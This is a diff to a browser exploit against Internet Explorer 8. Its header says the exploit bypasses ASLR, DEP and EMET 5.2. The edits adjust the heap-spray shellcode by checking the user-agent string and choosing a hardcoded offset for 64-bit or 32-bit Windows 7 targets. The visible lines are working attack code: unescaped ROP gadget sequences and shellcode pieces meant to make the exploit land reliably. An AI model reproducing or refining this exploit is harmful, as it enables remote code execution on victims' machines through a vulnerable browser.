@@ -1,6 +1,6 @@
 <!--
 ** Internet Explorer 8 Fixed Col Span ID full ASLR, DEP and EMET 5.2 bypass
-** Exploit Coded by sickness ** ** full EMET bypassed By R41P41 (modified ryujin's ROP chains and shellcode, greetz!!!)**Emet
+** Exploit Coded by sickness ** ** full EMET bypassed By R41P41 (modified ryujin's ROP chains and shellcode, greetz!!!)**
 **Note: addition/removal of new rop gadgets will fuck up alignment issues with hardcoded offsets.
 
 ** Affected Software: Internet Explorer 8
@@ -160,7 +160,12 @@ function heapspray(cbuttonlayout) {
 	shellcode+= unescape("%u"+rop8+"%u"+rop9);  	// jmp [eax]
 	shellcode+= unescape("%u"+ropnop3+"%u"+ropnop4);  	// pop ebp;retn	
 	shellcode+= unescape("%u00d0%u076d");			// ntdll string
-	shellcode+= unescape("%uffd8%u0001");			// offset goes into ebp
+	
+	if (navigator.userAgent.indexOf("WOW64") != -1 || navigator.userAgent.indexOf("Win64") != -1 )
+   	shellcode+= unescape("%uffd8%u0001");			// offset goes into ebp for 64bit win7 base
+	else 
+   	shellcode+= unescape("%u5360%u0004");			// offset goes into ebp for 32bit win7 base
+	
 	shellcode+= unescape("%u"+rop30+"%u"+rop31);	// add eax,ebp
 	
 	
